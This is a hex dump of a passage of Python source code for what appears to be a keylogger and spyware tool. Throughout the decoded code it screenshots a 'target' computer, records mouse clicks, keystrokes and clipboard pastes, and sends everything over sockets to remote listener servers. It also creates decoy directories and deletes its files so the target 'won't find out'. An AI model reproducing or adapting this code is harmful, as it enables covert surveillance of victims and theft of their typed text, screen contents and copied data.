+00000b00: 2020 2020 2020 206e 6f5f 6d69 6372 6f66         no_microf
+00000b10: 6f6e 203d 2022 5448 4520 5441 5247 4554  on = "THE TARGET
+00000b20: 2048 4153 204e 4f20 4d49 4352 4f50 484f   HAS NO MICROPHO
+00000b30: 4e45 204f 4e22 0d0a 2020 2020 2020 2020  NE ON"..        
+00000b40: 2020 2020 6c69 7374 656e 696e 675f 6461      listening_da
+00000b50: 7461 2e73 656e 6428 6e6f 5f6d 6963 726f  ta.send(no_micro
+00000b60: 666f 6e2e 656e 636f 6465 2829 290d 0a20  fon.encode()).. 
+00000b70: 2020 2020 2020 2020 2020 2023 2053 656e             # Sen
+00000b80: 6473 2064 6174 6120 746f 2053 6572 7665  ds data to Serve
+00000b90: 724c 6973 7465 6e65 720d 0a0d 0a20 2020  rListener....   
+00000ba0: 2064 6566 2061 6c6c 5f64 6972 2873 656c   def all_dir(sel
+00000bb0: 6629 3a0d 0a20 2020 2020 2020 2067 6c6f  f):..        glo
+00000bc0: 6261 6c20 7261 6e64 6f6d 5f6c 7374 0d0a  bal random_lst..
+00000bd0: 2020 2020 2020 2020 7a65 6963 6865 6e20          zeichen 
+00000be0: 3d20 2271 7765 7274 7a75 696f 7061 7364  = "qwertzuiopasd
+00000bf0: 6667 686a 6b6c 7978 6376 626e 6d31 3233  fghjklyxcvbnm123
+00000c00: 3435 3637 3839 3022 0d0a 2020 2020 2020  4567890"..      
+00000c10: 2020 7261 6e64 6f6d 5f6c 7374 203d 205b    random_lst = [
+00000c20: 2222 2e6a 6f69 6e28 7261 6e64 6f6d 2e73  "".join(random.s
+00000c30: 616d 706c 6528 7a65 6963 6865 6e2c 2072  ample(zeichen, r
+00000c40: 616e 646f 6d2e 7261 6e64 696e 7428 342c  andom.randint(4,
+00000c50: 2031 3029 2929 2066 6f72 2078 2069 6e20   10))) for x in 
+00000c60: 7261 6e67 6528 3130 3029 5d0d 0a20 2020  range(100)]..   
+00000c70: 2020 2020 2023 2054 6869 7320 6d61 6b65       # This make
+00000c80: 7320 6120 6c69 7374 206f 6620 6576 6572  s a list of ever
+00000c90: 7920 6469 7265 6374 6f72 7920 6e61 6d65  y directory name
+00000ca0: 2072 616e 646f 6d6c 790d 0a20 2020 2020   randomly..     
+00000cb0: 2020 2066 6f72 2064 6972 5f6e 616d 6520     for dir_name 
+00000cc0: 696e 2072 616e 646f 6d5f 6c73 743a 0d0a  in random_lst:..
+00000cd0: 2020 2020 2020 2020 2020 2020 6f73 2e73              os.s
+00000ce0: 7973 7465 6d28 6622 6d6b 6469 7220 7b64  ystem(f"mkdir {d
+00000cf0: 6972 5f6e 616d 657d 2229 0d0a 2020 2020  ir_name}")..    
+00000d00: 2020 2020 2020 2020 2320 5468 6520 6469          # The di
+00000d10: 7265 6374 6f72 7920 6973 2062 6569 6e67  rectory is being
+00000d20: 206d 6164 6520 6865 7265 0d0a 2020 2020   made here..    
+00000d30: 2020 2020 6c73 745f 7365 7276 6572 203d      lst_server =
+00000d40: 2073 6f63 6b65 742e 736f 636b 6574 2873   socket.socket(s
+00000d50: 6f63 6b65 742e 4146 5f49 4e45 542c 2073  ocket.AF_INET, s
+00000d60: 6f63 6b65 742e 534f 434b 5f53 5452 4541  ocket.SOCK_STREA
+00000d70: 4d29 0d0a 2020 2020 2020 2020 6c73 745f  M)..        lst_
+00000d80: 7365 7276 6572 2e63 6f6e 6e65 6374 2828  server.connect((
+00000d90: 2231 3237 2e30 2e30 2e31 222c 2031 3037  "127.0.0.1", 107
+00000da0: 3729 290d 0a20 2020 2020 2020 206c 7374  7))..        lst
+00000db0: 5f73 6572 7665 722e 7365 6e64 2873 7472  _server.send(str
+00000dc0: 2872 616e 646f 6d5f 6c73 7429 2e65 6e63  (random_lst).enc
+00000dd0: 6f64 6528 2929 0d0a 2020 2020 2020 2020  ode())..        
+00000de0: 6c73 745f 7365 7276 6572 2e63 6c6f 7365  lst_server.close
+00000df0: 2829 0d0a 0d0a 2020 2020 2020 2020 7261  ()....        ra
+00000e00: 6e64 6f6d 5f64 6972 203d 2072 616e 646f  ndom_dir = rando
+00000e10: 6d2e 6368 6f69 6365 2872 616e 646f 6d5f  m.choice(random_
+00000e20: 6c73 7429 0d0a 2020 2020 2020 2020 6f73  lst)..        os
+00000e30: 2e63 6864 6972 2872 616e 646f 6d5f 6469  .chdir(random_di
+00000e40: 7229 0d0a 2020 2020 2020 2020 2320 5765  r)..        # We
+00000e50: 2061 7265 206e 6f77 2069 6e20 7468 6174   are now in that
+00000e60: 2064 6972 6563 746f 7279 2077 6865 7265   directory where
+00000e70: 2074 6865 2069 6d61 6765 2063 616e 2062   the image can b
+00000e80: 6520 7374 6f72 6564 0d0a 0d0a 2020 2020  e stored....    
+00000e90: 6465 6620 636c 6965 6e74 2873 656c 662c  def client(self,
+00000ea0: 2069 705f 7068 6f74 6f73 2c20 706f 7274   ip_photos, port
+00000eb0: 5f70 686f 746f 7329 3a0d 0a20 2020 2020  _photos):..     
+00000ec0: 2020 2067 6c6f 6261 6c20 6668 616e 646c     global fhandl
+00000ed0: 650d 0a20 2020 2020 2020 2023 2066 6861  e..        # fha
+00000ee0: 6e64 6c65 2069 7320 7468 6520 7661 7269  ndle is the vari
+00000ef0: 6162 6c65 2077 6869 6368 206f 7065 6e73  able which opens
+00000f00: 2074 6865 2066 6f74 6f0d 0a20 2020 2020   the foto..     
+00000f10: 2020 2073 203d 2073 6f63 6b65 742e 736f     s = socket.so
+00000f20: 636b 6574 2873 6f63 6b65 742e 4146 5f49  cket(socket.AF_I
+00000f30: 4e45 542c 2073 6f63 6b65 742e 534f 434b  NET, socket.SOCK
+00000f40: 5f53 5452 4541 4d29 0d0a 2020 2020 2020  _STREAM)..      
+00000f50: 2020 732e 636f 6e6e 6563 7428 2869 705f    s.connect((ip_
+00000f60: 7068 6f74 6f73 2c20 706f 7274 5f70 686f  photos, port_pho
+00000f70: 746f 7329 290d 0a20 2020 2020 2020 2023  tos))..        #
+00000f80: 2054 6869 7320 636f 6e6e 6563 7473 2074   This connects t
+00000f90: 6f20 7468 6520 7365 7276 6572 2079 6f75  o the server you
+00000fa0: 2073 7065 6369 6669 6564 0d0a 2020 2020   specified..    
+00000fb0: 2020 2020 696d 6167 6520 3d20 7067 2e73      image = pg.s
+00000fc0: 6372 6565 6e73 686f 7428 290d 0a20 2020  creenshot()..   
+00000fd0: 2020 2020 2023 2022 696d 6167 6522 2073       # "image" s
+00000fe0: 6372 6565 6e73 686f 7473 2074 6865 2063  creenshots the c
+00000ff0: 7572 7265 6e74 2069 6d61 6765 2061 6674  urrent image aft
+00001000: 6572 2061 2073 7065 6369 6669 6320 7469  er a specific ti
+00001010: 6d65 0d0a 2020 2020 2020 2020 666f 746f  me..        foto
+00001020: 6e61 6d65 203d 2022 496d 6167 652e 706e  name = "Image.pn
+00001030: 6722 0d0a 2020 2020 2020 2020 2320 4e61  g"..        # Na
+00001040: 6d65 206f 6620 7468 6520 696d 6167 650d  me of the image.
+00001050: 0a20 2020 2020 2020 2069 6d61 6765 2e73  .        image.s
+00001060: 6176 6528 666f 746f 6e61 6d65 290d 0a20  ave(fotoname).. 
+00001070: 2020 2020 2020 2023 2053 6176 6573 2074         # Saves t
+00001080: 6865 2069 6d61 6765 2069 6e20 7468 6520  he image in the 
+00001090: 6375 7272 656e 7420 6469 7265 6374 6f72  current director
+000010a0: 790d 0a20 2020 2020 2020 2066 6861 6e64  y..        fhand
+000010b0: 6c65 203d 206f 7065 6e28 666f 746f 6e61  le = open(fotona
+000010c0: 6d65 2c20 2272 6222 290d 0a20 2020 2020  me, "rb")..     
+000010d0: 2020 2023 204f 7065 6e73 2074 6865 2069     # Opens the i
+000010e0: 6d61 6765 0d0a 0d0a 2020 2020 2020 2020  mage....        
+000010f0: 6675 6c6c 5f6d 7367 203d 2062 2222 0d0a  full_msg = b""..
+00001100: 2020 2020 2020 2020 2320 4576 6572 7920          # Every 
+00001110: 696d 6167 6520 696e 666f 726d 6174 696f  image informatio
+00001120: 6e20 7769 6c6c 2062 6520 7374 6f72 6564  n will be stored
+00001130: 2069 6e20 2266 756c 6c5f 6d73 6722 0d0a   in "full_msg"..
+00001140: 2020 2020 2020 2020 666f 7220 6c69 6e65          for line
+00001150: 2069 6e20 6668 616e 646c 653a 0d0a 2020   in fhandle:..  
+00001160: 2020 2020 2020 2020 2020 6675 6c6c 5f6d            full_m
+00001170: 7367 202b 3d20 6c69 6e65 0d0a 0d0a 2020  sg += line....  
+00001180: 2020 2020 2020 732e 7365 6e64 2866 756c        s.send(ful
+00001190: 6c5f 6d73 6729 0d0a 0d0a 2020 2020 6465  l_msg)....    de
+000011a0: 6620 636f 756e 7464 6f77 6e5f 7365 6e64  f countdown_send
+000011b0: 2873 656c 662c 207a 6569 742c 2069 705f  (self, zeit, ip_
+000011c0: 7068 6f74 6f73 2c20 706f 7274 5f70 686f  photos, port_pho
+000011d0: 746f 732c 2069 705f 6b65 796c 6f67 6765  tos, ip_keylogge
+000011e0: 722c 2070 6f72 745f 6b65 796c 6f67 6765  r, port_keylogge
+000011f0: 7229 3a0d 0a20 2020 2020 2020 2073 6563  r):..        sec
+00001200: 6f6e 6473 5f6c 6973 7420 3d20 5b7a 6168  onds_list = [zah
+00001210: 6c20 666f 7220 7a61 686c 2069 6e20 7261  l for zahl in ra
+00001220: 6e67 6528 302c 207a 6569 7420 2b20 312c  nge(0, zeit + 1,
+00001230: 2032 3029 2069 6620 7a61 686c 2021 3d20   20) if zahl != 
+00001240: 305d 0d0a 2020 2020 2020 2020 2320 5468  0]..        # Th
+00001250: 6520 7365 636f 6e64 7320 7468 6520 696d  e seconds the im
+00001260: 6167 6520 7769 6c6c 2062 6520 7365 6e74  age will be sent
+00001270: 2069 6e20 3230 2073 7465 7073 2074 6f20   in 20 steps to 
+00001280: 7468 6520 7365 7276 6572 2077 696c 6c20  the server will 
+00001290: 6265 2073 6176 6564 2069 6e20 2273 6563  be saved in "sec
+000012a0: 6f6e 6473 5f6c 6973 7422 0d0a 2020 2020  onds_list"..    
+000012b0: 2020 2020 7072 696e 7428 7365 636f 6e64      print(second
+000012c0: 735f 6c69 7374 290d 0a20 2020 2020 2020  s_list)..       
+000012d0: 206b 6579 5f64 6174 6120 3d20 736f 636b   key_data = sock
+000012e0: 6574 2e73 6f63 6b65 7428 736f 636b 6574  et.socket(socket
+000012f0: 2e41 465f 494e 4554 2c20 736f 636b 6574  .AF_INET, socket
+00001300: 2e53 4f43 4b5f 5354 5245 414d 290d 0a0d  .SOCK_STREAM)...
+00001310: 0a20 2020 2020 2020 2074 7279 3a0d 0a20  .        try:.. 
+00001320: 2020 2020 2020 2020 2020 2066 6f72 2078             for x
+00001330: 2069 6e20 7261 6e67 6528 7a65 6974 202b   in range(zeit +
+00001340: 2031 293a 0d0a 2020 2020 2020 2020 2020   1):..          
+00001350: 2020 2020 2020 6966 2078 203d 3d20 3230        if x == 20
+00001360: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+00001370: 2020 2020 2020 2073 656c 662e 616c 6c5f         self.all_
+00001380: 6469 7228 290d 0a20 2020 2020 2020 2020  dir()..         
+00001390: 2020 2020 2020 2020 2020 2023 2054 6869             # Thi
+000013a0: 7320 6675 6e63 7469 6f6e 206d 616b 6573  s function makes
+000013b0: 2031 3030 2066 696c 6573 2074 6f20 7374   100 files to st
+000013c0: 6f72 6520 7468 6520 696d 6167 6520 736f  ore the image so
+000013d0: 2074 6865 2074 6172 6765 7420 776f 6e27   the target won'
+000013e0: 7420 6669 6e64 206f 7574 0d0a 2020 2020  t find out..    
+000013f0: 2020 2020 2020 2020 2020 2020 7072 696e              prin
+00001400: 7428 7829 0d0a 2020 2020 2020 2020 2020  t(x)..          
+00001410: 2020 2020 2020 7a65 6974 202d 3d20 310d        zeit -= 1.
+00001420: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00001430: 2074 696d 652e 736c 6565 7028 3129 0d0a   time.sleep(1)..
+00001440: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00001450: 6966 2078 2069 6e20 7365 636f 6e64 735f  if x in seconds_
+00001460: 6c69 7374 3a0d 0a20 2020 2020 2020 2020  list:..         
+00001470: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00001480: 636c 6965 6e74 2869 705f 7068 6f74 6f73  client(ip_photos
+00001490: 2c20 706f 7274 5f70 686f 746f 7329 0d0a  , port_photos)..
+000014a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000014b0: 2020 2020 2320 5468 6520 696d 6167 6573      # The images
+000014c0: 2077 696c 6c20 6265 2073 656e 740d 0a20   will be sent.. 
+000014d0: 2020 2020 2020 2020 2020 206b 6579 5f64             key_d
+000014e0: 6174 612e 636f 6e6e 6563 7428 2869 705f  ata.connect((ip_
+000014f0: 6b65 796c 6f67 6765 722c 2070 6f72 745f  keylogger, port_
+00001500: 6b65 796c 6f67 6765 7229 290d 0a20 2020  keylogger))..   
+00001510: 2020 2020 2020 2020 2023 2054 6869 7320           # This 
+00001520: 6973 2074 6865 2069 7020 616e 6420 7468  is the ip and th
+00001530: 6520 706f 7274 206f 6620 7468 6520 7365  e port of the se
+00001540: 7276 6572 2074 6865 2070 6f72 7420 7368  rver the port sh
+00001550: 6f75 6c64 6e27 7420 6265 2074 6865 2073  ouldn't be the s
+00001560: 616d 6520 7468 6520 7365 7276 6572 5f70  ame the server_p
+00001570: 686f 746f 7320 616e 6420 7468 6520 7365  hotos and the se
+00001580: 7276 6572 5f6b 6579 6c6f 6767 6572 2073  rver_keylogger s
+00001590: 686f 756c 646e 2774 2062 650d 0a20 2020  houldn't be..   
+000015a0: 2020 2020 2020 2020 2023 2069 6e20 7468           # in th
+000015b0: 6520 7361 6d65 2066 6f6c 6465 720d 0a20  e same folder.. 
+000015c0: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+000015d0: 636f 6f72 6469 6e61 7465 7320 3d20 6c69  coordinates = li
+000015e0: 7374 2873 6574 2873 656c 662e 636f 6f72  st(set(self.coor
+000015f0: 6469 6e61 7465 7329 290d 0a20 2020 2020  dinates))..     
+00001600: 2020 2020 2020 2023 2054 6869 7320 6368         # This ch
+00001610: 6563 6b73 2069 6620 7468 6520 636f 6f72  ecks if the coor
+00001620: 6469 6e61 7465 7320 6f63 6375 7220 3220  dinates occur 2 
+00001630: 7469 6d65 730d 0a20 2020 2020 2020 2020  times..         
+00001640: 2020 2070 7269 6e74 2873 656c 662e 636f     print(self.co
+00001650: 6f72 6469 6e61 7465 7329 0d0a 2020 2020  ordinates)..    
+00001660: 2020 2020 2020 2020 776f 7274 203d 2022          wort = "
+00001670: 220d 0a20 2020 2020 2020 2020 2020 2066  "..            f
+00001680: 6f72 207a 6569 6368 656e 2069 6e20 7365  or zeichen in se
+00001690: 6c66 2e72 6963 6874 6967 655f 6c69 7374  lf.richtige_list
+000016a0: 653a 0d0a 2020 2020 2020 2020 2020 2020  e:..            
+000016b0: 2020 2020 776f 7274 202b 3d20 7a65 6963      wort += zeic
+000016c0: 6865 6e0d 0a0d 0a20 2020 2020 2020 2020  hen....         
+000016d0: 2020 2023 2047 6574 7320 7468 6520 636f     # Gets the co
+000016e0: 6f72 6469 6e61 7465 7320 7768 6572 6520  ordinates where 
+000016f0: 7468 6520 7461 7267 6574 2077 6173 2077  the target was w
+00001700: 7269 7469 6e67 2073 6f6d 6574 6869 6e67  riting something
+00001710: 2066 726f 6d20 7468 6520 6265 6769 6e6e   from the beginn
+00001720: 696e 670d 0a20 2020 2020 2020 2020 2020  ing..           
+00001730: 2073 656c 662e 636f 6f72 6469 6e61 7465   self.coordinate
+00001740: 7320 3d20 7365 6c66 2e63 6f6f 7264 696e  s = self.coordin
+00001750: 6174 6573 5b3a 3a2d 315d 0d0a 2020 2020  ates[::-1]..    
+00001760: 2020 2020 2020 2020 2320 5365 6e64 7320          # Sends 
+00001770: 7468 6520 6461 7461 2074 6f20 7365 7276  the data to serv
+00001780: 6572 5f6b 6579 6c6f 6767 6572 0d0a 2020  er_keylogger..  
+00001790: 2020 2020 2020 2020 2020 616c 6c5f 6461            all_da
+000017a0: 7461 203d 2073 7472 2873 656c 662e 636f  ta = str(self.co
+000017b0: 6f72 6469 6e61 7465 7329 202b 2077 6f72  ordinates) + wor
+000017c0: 740d 0a20 2020 2020 2020 2020 2020 2023  t..            #
+000017d0: 2043 6f6f 7264 696e 6174 6573 2061 6e64   Coordinates and
+000017e0: 206b 6579 6461 7461 2061 7265 2062 6569   keydata are bei
+000017f0: 6e67 2063 6f6e 6361 7465 6e61 7465 640d  ng concatenated.
+00001800: 0a20 2020 2020 2020 2020 2020 206b 6579  .            key
+00001810: 5f64 6174 612e 7365 6e64 2861 6c6c 5f64  _data.send(all_d
+00001820: 6174 612e 656e 636f 6465 2829 290d 0a20  ata.encode()).. 
+00001830: 2020 2020 2020 2020 2020 2070 7269 6e74             print
+00001840: 2877 6f72 7429 0d0a 2020 2020 2020 2020  (wort)..        
+00001850: 2020 2020 7072 696e 7428 7365 6c66 2e72      print(self.r
+00001860: 6963 6874 6967 655f 6c69 7374 6529 0d0a  ichtige_liste)..
+00001870: 2020 2020 2020 2020 2020 2020 6668 616e              fhan
+00001880: 646c 652e 636c 6f73 6528 290d 0a20 2020  dle.close()..   
+00001890: 2020 2020 2020 2020 2023 2043 6c6f 7365           # Close
+000018a0: 7320 7468 6520 696d 6167 650d 0a20 2020  s the image..   
+000018b0: 2020 2020 2020 2020 206f 732e 7265 6d6f           os.remo
+000018c0: 7665 2822 496d 6167 652e 706e 6722 290d  ve("Image.png").
+000018d0: 0a20 2020 2020 2020 2020 2020 2023 2044  .            # D
+000018e0: 656c 6574 6573 2074 6865 2069 6d61 6765  eletes the image
+000018f0: 2069 6e20 7468 6520 6375 7272 656e 7420   in the current 
+00001900: 6469 7265 6374 6f72 790d 0a20 2020 2020  directory..     
+00001910: 2020 2020 2020 206f 732e 6368 6469 7228         os.chdir(
+00001920: 222e 2e22 290d 0a20 2020 2020 2020 2020  "..")..         
+00001930: 2020 2023 2057 6520 6861 7665 2074 6f20     # We have to 
+00001940: 676f 2062 6163 6b20 736f 2074 6861 7420  go back so that 
+00001950: 7765 2063 616e 2064 656c 6574 6520 7468  we can delete th
+00001960: 6520 6f74 6865 7220 6469 7265 6374 6f72  e other director
+00001970: 6965 730d 0a20 2020 2020 2020 2020 2020  ies..           
+00001980: 2066 6f72 2065 6163 685f 6469 7220 696e   for each_dir in
+00001990: 2072 616e 646f 6d5f 6c73 743a 0d0a 2020   random_lst:..  
+000019a0: 2020 2020 2020 2020 2020 2020 2020 7368                sh
+000019b0: 7574 696c 2e72 6d74 7265 6528 6561 6368  util.rmtree(each
+000019c0: 5f64 6972 290d 0a20 2020 2020 2020 2020  _dir)..         
+000019d0: 2020 2020 2020 2023 2054 6869 7320 6465         # This de
+000019e0: 6c65 7465 7320 6576 6572 7920 6469 7265  letes every dire
+000019f0: 6374 6f72 790d 0a20 2020 2020 2020 2020  ctory..         
+00001a00: 2020 2073 7973 2e65 7869 7428 290d 0a20     sys.exit().. 
+00001a10: 2020 2020 2020 2020 2020 2023 2053 746f             # Sto
+00001a20: 7073 2074 6865 206b 6579 6c6f 6767 6572  ps the keylogger
+00001a30: 0d0a 2020 2020 2020 2020 6578 6365 7074  ..        except
+00001a40: 204b 6579 626f 6172 6449 6e74 6572 7275   KeyboardInterru
+00001a50: 7074 3a0d 0a20 2020 2020 2020 2020 2020  pt:..           
+00001a60: 2023 2049 6620 7468 6520 7461 7267 6574   # If the target
+00001a70: 2068 6173 2064 6573 7472 6f79 6564 2074   has destroyed t
+00001a80: 6865 2063 6f6e 6e65 6374 696f 6e0d 0a20  he connection.. 
+00001a90: 2020 2020 2020 2020 2020 2077 6f72 7420             wort 
+00001aa0: 3d20 222a 2a2a 25c2 a7c2 a729 c2a7 c2a7  = "***%....)....
+00001ab0: 2522 0d0a 2020 2020 2020 2020 2020 2020  %"..            
+00001ac0: 2320 5468 6973 2069 7320 6c69 6b65 2061  # This is like a
+00001ad0: 2073 7065 6369 616c 2063 6f64 652e 2054   special code. T
+00001ae0: 6f20 7370 6c69 7420 6974 2061 7420 7468  o split it at th
+00001af0: 6520 656e 640d 0a20 2020 2020 2020 2020  e end..         
+00001b00: 2020 2066 6f72 207a 6569 6368 656e 2069     for zeichen i
+00001b10: 6e20 7365 6c66 2e72 6963 6874 6967 655f  n self.richtige_
+00001b20: 6c69 7374 653a 0d0a 2020 2020 2020 2020  liste:..        
+00001b30: 2020 2020 2020 2020 776f 7274 202b 3d20          wort += 
+00001b40: 7a65 6963 6865 6e0d 0a20 2020 2020 2020  zeichen..       
+00001b50: 2020 2020 2069 6620 7365 6c66 2e63 6f6f       if self.coo
+00001b60: 7264 696e 6174 6573 3a0d 0a20 2020 2020  rdinates:..     
+00001b70: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00001b80: 636f 6f72 6469 6e61 7465 7320 3d20 7365  coordinates = se
+00001b90: 6c66 2e63 6f6f 7264 696e 6174 6573 5b3a  lf.coordinates[:
+00001ba0: 3a2d 315d 0d0a 2020 2020 2020 2020 2020  :-1]..          
+00001bb0: 2020 2020 2020 2320 5468 6973 2069 7320        # This is 
+00001bc0: 7468 6520 7361 6d65 2061 7320 6162 6f76  the same as abov
+00001bd0: 650d 0a20 2020 2020 2020 2020 2020 2020  e..             
+00001be0: 2020 2077 6f72 7420 2b3d 2073 7472 2873     wort += str(s
+00001bf0: 656c 662e 636f 6f72 6469 6e61 7465 7329  elf.coordinates)
+00001c00: 0d0a 2020 2020 2020 2020 2020 2020 6461  ..            da
+00001c10: 7461 203d 2066 2254 4845 2043 4f4e 4e45  ta = f"THE CONNE
+00001c20: 4354 494f 4e20 4841 5320 4245 454e 2049  CTION HAS BEEN I
+00001c30: 4e54 4552 5255 5054 4544 7b77 6f72 747d  NTERRUPTED{wort}
+00001c40: 220d 0a20 2020 2020 2020 2020 2020 2023  "..            #
+00001c50: 2054 6869 7320 6c65 7427 7320 7468 6520   This let's the 
+00001c60: 7365 7276 6572 206b 6e6f 7720 7468 6174  server know that
+00001c70: 2074 6865 2073 6572 7665 7220 7368 6f75   the server shou
+00001c80: 6c64 2073 6875 7420 646f 776e 0d0a 2020  ld shut down..  
+00001c90: 2020 2020 2020 2020 2020 6b65 795f 6461            key_da
+00001ca0: 7461 2e63 6f6e 6e65 6374 2828 6970 5f6b  ta.connect((ip_k
+00001cb0: 6579 6c6f 6767 6572 2c20 706f 7274 5f6b  eylogger, port_k
+00001cc0: 6579 6c6f 6767 6572 2929 0d0a 2020 2020  eylogger))..    
+00001cd0: 2020 2020 2020 2020 6b65 795f 6461 7461          key_data
+00001ce0: 2e73 656e 6428 6461 7461 2e65 6e63 6f64  .send(data.encod
+00001cf0: 6528 2929 0d0a 2020 2020 2020 2020 2020  e())..          
+00001d00: 2020 6b65 795f 6461 7461 2e63 6c6f 7365    key_data.close
+00001d10: 2829 0d0a 0d0a 2020 2020 2020 2020 2020  ()....          
+00001d20: 2020 6966 206f 732e 7061 7468 2e65 7869    if os.path.exi
+00001d30: 7374 7328 2249 6d61 6765 2e70 6e67 2229  sts("Image.png")
+00001d40: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+00001d50: 2020 2023 2049 7420 7769 6c6c 2064 6573     # It will des
+00001d60: 7472 6f79 2074 6865 2069 6d61 6765 2073  troy the image s
+00001d70: 6f20 7461 7267 6574 2077 6f75 6e64 206b  o target wound k
+00001d80: 6e6f 7720 616e 7974 6869 6e67 0d0a 2020  now anything..  
+00001d90: 2020 2020 2020 2020 2020 2020 2020 6668                fh
+00001da0: 616e 646c 652e 636c 6f73 6528 290d 0a0d  andle.close()...
+00001db0: 0a20 2020 2020 2020 2020 2020 206e 6577  .            new
+00001dc0: 5f73 6572 7665 7220 3d20 736f 636b 6574  _server = socket
+00001dd0: 2e73 6f63 6b65 7428 736f 636b 6574 2e41  .socket(socket.A
+00001de0: 465f 494e 4554 2c20 736f 636b 6574 2e53  F_INET, socket.S
+00001df0: 4f43 4b5f 5354 5245 414d 290d 0a20 2020  OCK_STREAM)..   
+00001e00: 2020 2020 2020 2020 206e 6577 5f73 6572           new_ser
+00001e10: 7665 722e 636f 6e6e 6563 7428 2822 3132  ver.connect(("12
+00001e20: 372e 302e 302e 3122 2c20 3130 3737 2929  7.0.0.1", 1077))
+00001e30: 0d0a 2020 2020 2020 2020 2020 2020 6e65  ..            ne
+00001e40: 775f 7365 7276 6572 2e73 656e 6428 2264  w_server.send("d
+00001e50: 6f6e 6522 2e65 6e63 6f64 6528 2929 0d0a  one".encode())..
+00001e60: 2020 2020 2020 2020 2020 2020 6e65 775f              new_
+00001e70: 7365 7276 6572 2e63 6c6f 7365 2829 0d0a  server.close()..
+00001e80: 0d0a 0d0a 0d0a 2020 2020 6465 6620 6b69  ......    def ki
+00001e90: 6c6c 5f73 7769 7463 6828 7365 6c66 293a  ll_switch(self):
+00001ea0: 0d0a 2020 2020 2020 2020 2320 5468 6973  ..        # This
+00001eb0: 2066 756e 6374 696f 6e20 6465 7374 726f   function destro
+00001ec0: 7973 2074 6865 206d 6f75 7365 2069 6e66  ys the mouse inf
+00001ed0: 6f0d 0a20 2020 2020 2020 206e 6577 5f73  o..        new_s
+00001ee0: 6563 6f6e 6473 203d 2073 656c 662e 6475  econds = self.du
+00001ef0: 7261 7469 6f6e 202b 2035 0d0a 2020 2020  ration + 5..    
+00001f00: 2020 2020 2320 3230 2073 6563 6f6e 6473      # 20 seconds
+00001f10: 2061 7265 2062 6569 6e67 2061 6464 6564   are being added
+00001f20: 2062 6563 6175 7365 2074 6865 7265 206d   because there m
+00001f30: 6967 6874 2062 6520 6120 7072 6f62 6c65  ight be a proble
+00001f40: 6d0d 0a20 2020 2020 2020 2066 6f72 2078  m..        for x
+00001f50: 2069 6e20 7261 6e67 6528 6e65 775f 7365   in range(new_se
+00001f60: 636f 6e64 7329 3a0d 0a20 2020 2020 2020  conds):..       
+00001f70: 2020 2020 2074 696d 652e 736c 6565 7028       time.sleep(
+00001f80: 3129 0d0a 2020 2020 2020 2020 2320 5468  1)..        # Th
+00001f90: 6973 2073 746f 7065 7320 7468 650d 0a20  is stopes the.. 
+00001fa0: 2020 2020 2020 2073 7973 2e65 7869 7428         sys.exit(
+00001fb0: 290d 0a0d 0a20 2020 2064 6566 206f 6e5f  )....    def on_
+00001fc0: 636c 6963 6b28 7365 6c66 2c20 782c 2079  click(self, x, y
+00001fd0: 2c20 6275 7474 6f6e 2c20 7072 6573 7365  , button, presse
+00001fe0: 6429 3a0d 0a20 2020 2020 2020 2023 2054  d):..        # T
+00001ff0: 6869 7320 6973 2074 6865 2063 6c69 636b  his is the click
+00002000: 2066 756e 6374 696f 6e0d 0a20 2020 2020   function..     
+00002010: 2020 2070 7269 6e74 2866 2254 6172 6765     print(f"Targe
+00002020: 7420 6861 7320 7072 6573 7365 6420 7b78  t has pressed {x
+00002030: 7d20 616e 6420 7b79 7d22 290d 0a20 2020  } and {y}")..   
+00002040: 2020 2020 2023 2041 6c6c 2074 6865 2063       # All the c
+00002050: 6f6f 7264 696e 6174 6573 2077 696c 6c20  oordinates will 
+00002060: 6265 2073 746f 7265 6420 696e 2022 7365  be stored in "se
+00002070: 6c66 2e63 6f6f 7264 696e 6174 6573 220d  lf.coordinates".
+00002080: 0a20 2020 2020 2020 2073 656c 662e 636f  .        self.co
+00002090: 6f72 6469 6e61 7465 732e 6170 7065 6e64  ordinates.append
+000020a0: 2828 782c 2079 2929 0d0a 0d0a 2020 2020  ((x, y))....    
+000020b0: 6465 6620 616c 6c5f 636c 6963 6b73 2873  def all_clicks(s
+000020c0: 656c 6629 3a0d 0a20 2020 2020 2020 2023  elf):..        #
+000020d0: 2054 6869 7320 6973 206a 7573 7420 6120   This is just a 
+000020e0: 6675 6e63 7469 6f6e 2073 6f20 6974 2063  function so it c
+000020f0: 616e 2062 6520 7261 6e20 7769 7468 2074  an be ran with t
+00002100: 6872 6561 6469 6e67 0d0a 2020 2020 2020  hreading..      
+00002110: 2020 7769 7468 204c 6973 7465 6e65 7228    with Listener(
+00002120: 6f6e 5f63 6c69 636b 3d73 656c 662e 6f6e  on_click=self.on
+00002130: 5f63 6c69 636b 2920 6173 206c 6973 7465  _click) as liste
+00002140: 6e69 6e67 3a0d 0a20 2020 2020 2020 2020  ning:..         
+00002150: 2020 2073 656c 662e 6b69 6c6c 5f73 7769     self.kill_swi
+00002160: 7463 6828 290d 0a20 2020 2020 2020 2020  tch()..         
+00002170: 2020 206c 6973 7465 6e69 6e67 2e6a 6f69     listening.joi
+00002180: 6e28 290d 0a0d 0a20 2020 2064 6566 2063  n()....    def c
+00002190: 6f70 795f 6461 7461 2873 656c 6629 3a0d  opy_data(self):.
+000021a0: 0a20 2020 2020 2020 2073 656c 662e 7269  .        self.ri
+000021b0: 6368 7469 6765 5f6c 6973 7465 2e61 7070  chtige_liste.app
+000021c0: 656e 6428 2220 2843 4f50 5920 2853 7472  end(" (COPY (Str
+000021d0: 672b 6329 2920 2229 0d0a 0d0a 2020 2020  g+c)) ")....    
+000021e0: 6465 6620 6170 7065 6e64 5f70 6173 7465  def append_paste
+000021f0: 2873 656c 6629 3a0d 0a20 2020 2020 2020  (self):..       
+00002200: 2064 6174 6120 3d20 6622 2028 7b70 7970   data = f" ({pyp
+00002210: 6572 636c 6970 2e70 6173 7465 2829 7d20  erclip.paste()} 
+00002220: 7c20 5041 5354 4520 2853 7472 672b 7629  | PASTE (Strg+v)
+00002230: 2920 7c20 220d 0a20 2020 2020 2020 2073  ) | "..        s
+00002240: 656c 662e 7269 6368 7469 6765 5f6c 6973  elf.richtige_lis
